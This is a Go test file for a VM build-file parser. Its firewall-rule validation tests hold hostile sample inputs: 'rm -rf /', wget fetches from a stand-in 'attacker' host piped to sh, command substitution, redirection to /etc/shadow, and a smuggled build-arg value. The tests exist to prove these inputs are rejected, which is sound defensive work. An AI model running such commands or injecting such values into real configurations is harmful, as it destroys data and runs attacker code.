func TestCopyChmodRejectsSetuidSetgidSticky(t *testing.T) {
	for _, val := range []string{"4755", "2755", "1755", "7777"} {
		if _, err := Parse(writeTemp(t, "COPY --chmod="+val+" ./a /b\n"), nil); err == nil {
			t.Errorf("expected error for --chmod=%s (setuid/setgid/sticky bit set)", val)
		}
	}
	// Sanity check: an ordinary permission with none of 0o7000 set still
	// parses fine.
	if _, err := Parse(writeTemp(t, "COPY --chmod=0755 ./a /b\n"), nil); err != nil {
		t.Errorf("--chmod=0755 should be valid: %v", err)
	}
}

func TestArgSubstitution(t *testing.T) {
	content := "ARG VERSION=1.0\nENV APP_VERSION=${VERSION}\nHOSTNAME vm-$VERSION\n"
	hf, err := Parse(writeTemp(t, content), nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(hf.Env) != 1 || hf.Env[0].Value != "1.0" {
		t.Errorf("Env = %+v, want APP_VERSION=1.0", hf.Env)
	}
	if hf.Hostname != "vm-1.0" {
		t.Errorf("Hostname = %q, want vm-1.0", hf.Hostname)
	}
}

func TestArgBuildArgOverridesDefault(t *testing.T) {
	content := "ARG VERSION=1.0\nENV APP_VERSION=${VERSION}\n"
	hf, err := Parse(writeTemp(t, content), map[string]string{"VERSION": "2.0"})
	if err != nil {
		t.Fatal(err)
	}
	if hf.Env[0].Value != "2.0" {
		t.Errorf("Env[0].Value = %q, want 2.0 (--build-arg should win over the default)", hf.Env[0].Value)
	}
}

func TestArgNoDefaultRequiresBuildArg(t *testing.T) {
	if _, err := Parse(writeTemp(t, "ARG VERSION\n"), nil); err == nil {
		t.Error("expected error for ARG with no default and no --build-arg supplied")
	}
	hf, err := Parse(writeTemp(t, "ARG VERSION\nENV V=${VERSION}\n"), map[string]string{"VERSION": "3.0"})
	if err != nil {
		t.Fatal(err)
	}
	if hf.Env[0].Value != "3.0" {
		t.Errorf("Env[0].Value = %q, want 3.0", hf.Env[0].Value)
	}
}

// F6.5/HB-F-011: WIFI/WIFIPSK/WIFICOUNTRY get ARG substitution "for
// free" via the same generic substituteArgs pass every other directive
// value already goes through (see Parse's main loop) -- this test
// exists to actually confirm that for WIFIPSK specifically (the one
// directive where it matters most, since --build-arg is the recommended
// way to avoid committing a real secret to the Nimbusfile) rather than
// just assuming the generic mechanism covers it.
func TestWIFIPSKAcceptsBuildArgSubstitution(t *testing.T) {
	content := "ARG WIFI_PSK\nHARDBOOT wifi\nWIFI MyNetwork\nWIFIPSK ${WIFI_PSK}\nWIFICOUNTRY BR\n"
	hf, err := Parse(writeTemp(t, content), map[string]string{"WIFI_PSK": "supersecretpassphrase1"})
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if hf.WiFiPSK != "supersecretpassphrase1" {
		t.Errorf("WiFiPSK = %q, want the --build-arg-supplied value", hf.WiFiPSK)
	}
}

func TestArgUndeclaredReferenceErrors(t *testing.T) {
	if _, err := Parse(writeTemp(t, "ENV V=${NEVER_DECLARED}\n"), nil); err == nil {
		t.Error("expected error referencing an ARG that was never declared")
	}
}

func TestArgUnterminatedBrace(t *testing.T) {
	if _, err := Parse(writeTemp(t, "ARG V=1\nENV X=${V\n"), nil); err == nil {
		t.Error("expected error for unterminated ${")
	}
}

func TestArgLiteralDollarSignPassesThrough(t *testing.T) {
	hf, err := Parse(writeTemp(t, "ENV PRICE=$5\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.Env[0].Value != "$5" {
		t.Errorf("Env[0].Value = %q, want literal $5 (no ARG named '5')", hf.Env[0].Value)
	}
}

func TestAgentHeader(t *testing.T) {
	content := "AGENT http://169.254.169.254/computeMetadata/v1/ 5\nAGENT header Metadata-Flavor: Google\n"
	hf, err := Parse(writeTemp(t, content), nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(hf.Agent.Headers) != 1 || hf.Agent.Headers[0].Name != "Metadata-Flavor" || hf.Agent.Headers[0].Value != "Google" {
		t.Errorf("Headers = %+v", hf.Agent.Headers)
	}
}

func TestAgentHeaderWithoutColon(t *testing.T) {
	content := "AGENT http://x/y 5\nAGENT header Authorization Bearer-Oracle\n"
	hf, err := Parse(writeTemp(t, content), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.Agent.Headers[0].Name != "Authorization" || hf.Agent.Headers[0].Value != "Bearer-Oracle" {
		t.Errorf("Headers = %+v", hf.Agent.Headers)
	}
}

func TestAgentHeaderRequiresPrecedingHTTPAgent(t *testing.T) {
	if _, err := Parse(writeTemp(t, "AGENT header X: Y\n"), nil); err == nil {
		t.Error("expected error: AGENT header with no preceding AGENT <url> line")
	}
	if _, err := Parse(writeTemp(t, "AGENT vboxguest /prop\nAGENT header X: Y\n"), nil); err == nil {
		t.Error("expected error: AGENT header doesn't apply to vboxguest kind")
	}
}

func TestAgentNewKinds(t *testing.T) {
	tests := []struct {
		content  string
		wantKind string
		wantURL  string
	}{
		{"AGENT virtio-serial /dev/vport0p1 5\n", "virtio-serial", "/dev/vport0p1"},
		{"AGENT vmware some-key 5\n", "vmware", "some-key"},
		{"AGENT aws-imds instance-id 5\n", "aws-imds", "instance-id"},
		{"AGENT ibm-imds instance/id 5\n", "ibm-imds", "instance/id"},
	}
	for _, tt := range tests {
		hf, err := Parse(writeTemp(t, tt.content), nil)
		if err != nil {
			t.Fatalf("%q: %v", tt.content, err)
		}
		if hf.Agent.Kind != tt.wantKind || hf.Agent.URL != tt.wantURL {
			t.Errorf("%q: Agent = %+v, want kind=%s url=%s", tt.content, hf.Agent, tt.wantKind, tt.wantURL)
		}
	}
}

// T90: FIREWALL rule text is spliced unquoted into a root-run shell
// script (internal/rootfs/build.go's buildFirewallScript), and can carry
// an ARG substituted from --build-arg -- a far more attacker-reachable
// input than a committed Nimbusfile line. These table-driven cases cover
// both the metacharacter check and the "must start with a real iptables
// operation" check.
func TestFirewallRuleValidation(t *testing.T) {
	valid := []string{
		"-P INPUT DROP",
		"-A INPUT -p tcp --dport 8080 -j ACCEPT",
		"-I INPUT 1 -s 10.0.0.0/8 -j DROP",
		"--append INPUT -j ACCEPT",
		"-N CNIMBUS_CUSTOM",
		"-F INPUT",
	}
	for _, rule := range valid {
		if _, err := Parse(writeTemp(t, "FIREWALL "+rule+"\n"), nil); err != nil {
			t.Errorf("expected %q to be accepted, got error: %v", rule, err)
		}
	}

	invalid := []struct {
		rule   string
		reason string
	}{
		{"-A INPUT -p tcp --dport 8080 -j ACCEPT; rm -rf /", "semicolon command separator"},
		{"-A INPUT -j ACCEPT && wget http://attacker/x", "&& command chaining"},
		{"-A INPUT -j ACCEPT | sh", "pipe to a shell"},
		{"-A INPUT -j ACCEPT `id`", "backtick command substitution"},
		{"-A INPUT -j ACCEPT $(id)", "$() command substitution"},
		{"-A INPUT -j ACCEPT > /etc/passwd", "output redirection"},
		{"-A INPUT -j ACCEPT < /etc/shadow", "input redirection"},
		{"wget http://attacker/x -O /tmp/x", "does not start with a real iptables operation"},
		{"", "empty rule"},
	}
	for _, tt := range invalid {
		content := "FIREWALL " + tt.rule + "\n"
		if tt.rule == "" {
			continue // empty FIREWALL is rejected earlier, by the "requires an iptables rule" check -- not this validator
		}
		if _, err := Parse(writeTemp(t, content), nil); err == nil {
			t.Errorf("expected %q to be rejected (%s), got no error", tt.rule, tt.reason)
		}
	}
}

// TestFirewallRuleValidationCatchesBuildArgInjection simulates the
// exact attack T90 describes: a Nimbusfile referencing an ARG in a
// FIREWALL rule, built with a --build-arg value crafted to break out of
// the intended single dport token.
func TestFirewallRuleValidationCatchesBuildArgInjection(t *testing.T) {
	content := "ARG PORT=8080\nFIREWALL -A INPUT -p tcp --dport ${PORT} -j ACCEPT\n"
	path := writeTemp(t, content)

	if _, err := Parse(path, map[string]string{"PORT": "8080"}); err != nil {
		t.Errorf("expected a benign --build-arg PORT=8080 to be accepted, got: %v", err)
	}

	malicious := "8080 -j ACCEPT\nwget http://attacker/x -O /tmp/x; sh /tmp/x #"
	if _, err := Parse(path, map[string]string{"PORT": malicious}); err == nil {
		t.Error("expected a --build-arg value injecting a semicolon-separated command to be rejected")
	}
}

// T91: FIREWALL_ON_ERROR must accept only "open"/"closed" and be
// unset ("") by default, matching every Nimbusfile written before this
// directive existed.
func TestFirewallOnError(t *testing.T) {
	hf, err := Parse(writeTemp(t, "FIREWALL -P INPUT DROP\nFIREWALL_ON_ERROR closed\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.FirewallOnError != "closed" {
		t.Errorf("FirewallOnError = %q, want closed", hf.FirewallOnError)
	}

	hf, err = Parse(writeTemp(t, "FIREWALL -P INPUT DROP\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.FirewallOnError != "" {
		t.Errorf("FirewallOnError = %q, want empty (no directive present)", hf.FirewallOnError)
	}

	if _, err := Parse(writeTemp(t, "FIREWALL_ON_ERROR bogus\n"), nil); err == nil {
		t.Error("expected an error for an invalid FIREWALL_ON_ERROR value")
	}
}

// AD-047: FIREWALL6 mirrors FIREWALL's own parsing/validation exactly
// (same validateFirewallRule, same shell-metachar/op-token checks) but
// populates a separate Firewall6 list, independent of Firewall.
func TestFirewall6Parsing(t *testing.T) {
	hf, err := Parse(writeTemp(t, "FIREWALL -P INPUT DROP\nFIREWALL6 -P INPUT DROP\nFIREWALL6 -A INPUT -p tcp --dport 8080 -j ACCEPT\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(hf.Firewall) != 1 || hf.Firewall[0] != "-P INPUT DROP" {
		t.Errorf("Firewall = %v, want a single IPv4 rule unaffected by FIREWALL6", hf.Firewall)
	}
	want := []string{"-P INPUT DROP", "-A INPUT -p tcp --dport 8080 -j ACCEPT"}
	if len(hf.Firewall6) != len(want) || hf.Firewall6[0] != want[0] || hf.Firewall6[1] != want[1] {
		t.Errorf("Firewall6 = %v, want %v", hf.Firewall6, want)
	}

	if _, err := Parse(writeTemp(t, "FIREWALL6\n"), nil); err == nil {
		t.Error("expected an empty FIREWALL6 to be rejected")
	}
	if _, err := Parse(writeTemp(t, "FIREWALL6 -A INPUT -j ACCEPT; rm -rf /\n"), nil); err == nil {
		t.Error("expected a FIREWALL6 rule with a shell metacharacter to be rejected")
	}
}

// T52: TMPSIZE overrides the tmpfs size= for stage 1's four exec-dir
// mounts (see internal/rootfs's defaultTmpfsSize).
func TestParseTMPSIZE(t *testing.T) {
	hf, err := Parse(writeTemp(t, "TMPSIZE 128m\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.TmpfsSize != "128m" {
		t.Errorf("TmpfsSize = %q, want 128m", hf.TmpfsSize)
	}

	hf, err = Parse(writeTemp(t, "HOSTNAME x\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.TmpfsSize != "" {
		t.Errorf("TmpfsSize = %q, want empty (no directive present)", hf.TmpfsSize)
	}

	for _, bad := range []string{"TMPSIZE 0\n", "TMPSIZE -5m\n", "TMPSIZE abc\n", "TMPSIZE 5x\n", "TMPSIZE\n"} {
		if _, err := Parse(writeTemp(t, bad), nil); err == nil {
			t.Errorf("expected an error for invalid TMPSIZE directive %q", bad)
		}
	}
}

func TestParseSTOPGRACE(t *testing.T) {
	hf, err := Parse(writeTemp(t, "STOPGRACE 30\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.StopGrace != 30 {
		t.Errorf("StopGrace = %d, want 30", hf.StopGrace)
	}

	hf, err = Parse(writeTemp(t, "HOSTNAME x\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.StopGrace != 0 {
		t.Errorf("StopGrace = %d, want 0 (no directive present)", hf.StopGrace)
	}

	for _, bad := range []string{"STOPGRACE 0\n", "STOPGRACE -5\n", "STOPGRACE abc\n", "STOPGRACE\n"} {
		if _, err := Parse(writeTemp(t, bad), nil); err == nil {
			t.Errorf("expected an error for invalid STOPGRACE directive %q", bad)
		}
	}
}

// T81 step 1: PIECESKEY pins the Ed25519 public key build-disk must
// verify pieces.sha256.sig against.
func TestParsePIECESKEY(t *testing.T) {
	validKey := strings.Repeat("ab", 32) // 32 bytes, well-formed hex, not a real key
	hf, err := Parse(writeTemp(t, "PIECESKEY "+validKey+"\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.PiecesKey != validKey {
		t.Errorf("PiecesKey = %q, want %q", hf.PiecesKey, validKey)
	}

	hf, err = Parse(writeTemp(t, "HOSTNAME x\n"), nil)
	if err != nil {
		t.Fatal(err)
	}
	if hf.PiecesKey != "" {
		t.Errorf("PiecesKey = %q, want empty (no directive present)", hf.PiecesKey)
	}

	for _, bad := range []string{
		"PIECESKEY \n",
		"PIECESKEY nothex\n",
		"PIECESKEY ab\n",                        // too short
		"PIECESKEY " + strings.Repeat("ab", 40) + "\n", // too long
	} {
		if _, err := Parse(writeTemp(t, bad), nil); err == nil {
			t.Errorf("expected an error for invalid PIECESKEY directive %q", bad)
		}
	}
}
